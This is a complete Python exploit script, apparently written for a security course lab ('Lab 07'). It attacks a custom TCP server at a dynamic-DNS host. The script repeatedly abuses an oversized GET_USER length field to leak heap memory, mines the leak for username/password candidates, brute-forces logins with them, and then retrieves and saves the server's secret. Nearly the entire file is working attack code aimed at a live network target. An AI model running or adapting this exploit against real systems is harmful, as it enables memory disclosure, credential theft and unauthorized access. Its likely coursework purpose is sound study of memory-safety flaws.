#!/usr/bin/env python3
import socket
import struct
import sys
import time
import random
import string

"""
Heap leak exploit for Lab 07 server.

Usage:
    python3 exploit_live_reclass_v2.py reclass.ddns.net 7664

This script:
  * Once per iteration:
      - Opens one attacker connection
      - Sets a small username
      - Abuses GET_USER to request a large length (heap leak)
      - Parses leaked heap for human-like strings
      - Builds (username, password) candidate pairs
      - Tries to authenticate with each candidate
      - On success, calls GET_SECRET and saves proof
"""

# Target config
HOST = sys.argv[1] if len(sys.argv) > 1 else "reclass.ddns.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7664

# Exploit tuning
LEAK_SIZE = 0xfff0          # request size for GET_USER
ITERATIONS = 4000           # max iterations
MIN_STR_LEN = 4             # minimum length of "human-ish" string
MAX_STR_LEN = 32            # maximum length of candidate string
MAX_PAIR_GAP = 80           # maximum distance between user and pass in bytes

# Timing
BASE_SLEEP = 0.5            # base sleep between iterations (seconds)
JITTER = 0.3                # extra random delay up to this many seconds

# Common password guesses to try with single strings
COMMON_PASSWORDS = [
    b"password",
    b"pass",
    b"1234",
    b"secret",
    b"test123",
]


def recvn(sock, n, timeout=2.0):
    """Receive exactly n bytes or fewer if the peer closes."""
    sock.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except Exception:
            break
        if not chunk:
            break
        buf += chunk
    return buf


def make_conn():
    """Open a connection and consume the greeting byte."""
    s = socket.socket()
    s.connect((HOST, PORT))
    greeting = recvn(s, 1, timeout=2.0)
    if len(greeting) != 1:
        raise RuntimeError(f"Did not get greeting byte, got {greeting!r}")
    return s


def set_user(sock, username):
    """
    Send SET_USER (type 0).
    username must already include trailing null.
    """
    hdr = struct.pack("<BH", 0, len(username))
    sock.sendall(hdr + username)

    ack = recvn(sock, 1)
    if ack != b"\x06":
        raise RuntimeError(f"SET_USER ack mismatch: {ack!r}")

    echo = recvn(sock, len(username))
    if echo != username:
        raise RuntimeError(f"SET_USER echo mismatch: {echo!r} != {username!r}")


def try_pass(sock, password):
    """
    Send TRY_PASS (type 2).
    password must already include trailing null.
    Returns True on success (ack 0x08).
    """
    hdr = struct.pack("<BH", 2, len(password))
    sock.sendall(hdr + password)

    ack = recvn(sock, 1)
    return ack == b"\x08"


def get_secret_with_creds(user, pw):
    """
    Try to authenticate with (user, pw) and then GET_SECRET.
    Returns secret bytes on success, None otherwise.
    """
    try:
        s = make_conn()
    except Exception as e:
        print("[!] get_secret_with_creds: connect error", e)
        return None

    try:
        set_user(s, user)
        if not try_pass(s, pw):
            s.close()
            return None

        print(f"[+] AUTH OK with {user!r} {pw!r}")

        # GET_SECRET: type 4 with requested size
        hdr = struct.pack("<BH", 4, 0xffff)
        s.sendall(hdr)

        ack = recvn(s, 1)
        if ack != b"\x0a":
            print("[!] GET_SECRET ack mismatch:", ack)
            s.close()
            return None

        secret = recvn(s, 65535)
        s.close()
        return secret

    except Exception as e:
        print("[!] get_secret_with_creds error", e)
        try:
            s.close()
        except Exception:
            pass
        return None


def extract_humanish_strings(data, min_len=4, max_len=32):
    """
    Extract printable, "human-ish" strings from data.

    Criteria:
      * characters only letters and digits
      * length between min_len and max_len
      * at least 3 unique characters
    Returns list of (offset, bytes) pairs.
    """
    allowed = bytes(string.ascii_letters + string.digits, "ascii")
    results = []
    start = None

    for i, b in enumerate(data):
        if b in allowed:
            if start is None:
                start = i
        else:
            if start is not None:
                length = i - start
                if min_len <= length <= max_len:
                    s = data[start:i]
                    if len(set(s)) >= 3:
                        results.append((start, s))
                start = None

    if start is not None:
        length = len(data) - start
        if min_len <= length <= max_len:
            s = data[start:len(data)]
            if len(set(s)) >= 3:
                results.append((start, s))

    return results


def build_candidates_from_dump(data):
    """
    Build candidate (username, password) pairs from one leaked blob.

    Strategy:
      * Find human-ish strings in the dump.
      * Pair consecutive strings within MAX_PAIR_GAP as (user, pass).
      * For each string, also try (string, COMMON_PASSWORDS).
      * Deduplicate pairs.
    """
    strings = extract_humanish_strings(data, min_len=MIN_STR_LEN, max_len=MAX_STR_LEN)
    strings.sort(key=lambda x: x[0])

    candidates = []

    # Pair consecutive human-ish strings
    for i in range(len(strings) - 1):
        off1, s1 = strings[i]
        off2, s2 = strings[i + 1]
        gap = off2 - off1
        if 0 < gap <= MAX_PAIR_GAP:
            candidates.append((s1 + b"\x00", s2 + b"\x00"))

    # Single strings with common passwords
    for off, s1 in strings:
        for pw in COMMON_PASSWORDS:
            candidates.append((s1 + b"\x00", pw + b"\x00"))

    # Deduplicate
    unique = []
    seen = set()
    for u, p in candidates:
        if (u, p) not in seen:
            seen.add((u, p))
            unique.append((u, p))

    return unique


def leak_once():
    """
    Perform one attacker leak:
      * connect
      * SET_USER("AAAAAAAA")
      * GET_USER big size
    Returns leaked bytes or None on error.
    """
    try:
        s = make_conn()
    except Exception as e:
        print("[!] leak_once: connect error", e)
        return None

    try:
        attacker_user = b"AAAAAAAA" + b"\x00"
        set_user(s, attacker_user)

        # GET_USER: type 1, length = LEAK_SIZE
        hdr = struct.pack("<BH", 1, LEAK_SIZE)
        s.sendall(hdr)

        ack = recvn(s, 1)
        if ack != b"\x06":
            raise RuntimeError(f"GET_USER ack mismatch: {ack!r}")

        dump = recvn(s, LEAK_SIZE)
        s.close()
        return dump

    except Exception as e:
        print("[!] leak_once error:", e)
        try:
            s.close()
        except Exception:
            pass
        return None


def main():
    print(f"[*] Live heap exploit against {HOST}:{PORT}")
    print(f"[*] Leak size {LEAK_SIZE}, iterations {ITERATIONS}")

    for it in range(ITERATIONS):
        print(f"\n[*] iteration {it}")
        dump = leak_once()
        if not dump:
            print("    [!] no dump this iteration")
            time.sleep(BASE_SLEEP + random.random() * JITTER)
            continue

        print(f"    leak len {len(dump)}")

        if dump.count(b"\x00") == len(dump):
            print("    dump is all zeros, skipping")
            time.sleep(BASE_SLEEP + random.random() * JITTER)
            continue

        candidates = build_candidates_from_dump(dump)
        print(f"    found {len(candidates)} candidate pairs")

        # For debugging, show first few raw strings actually found
        if candidates:
            sample = set(u.rstrip(b"\x00") for (u, _) in candidates[:5])
            print("    sample usernames:", [s.decode('ascii', 'ignore') for s in sample])

        for (u, p) in candidates:
            print(f"      trying candidate: {u!r} {p!r}")
            secret = get_secret_with_creds(u, p)
            if secret is not None:
                print("[+] SUCCESS")
                print("[+] Secret (first 256 bytes):")
                print(secret[:256])

                # Save dump and creds for the report
                with open("success_dump.bin", "wb") as f:
                    f.write(dump)
                with open("success_creds.txt", "w") as f:
                    f.write(f"username: {u!r}\npassword: {p!r}\n")
                return

        # Align roughly with the victim cycle but add jitter
        time.sleep(BASE_SLEEP + random.random() * JITTER)

    print("[!] Gave up after all iterations without success")


if __name__ == "__main__":
    main()
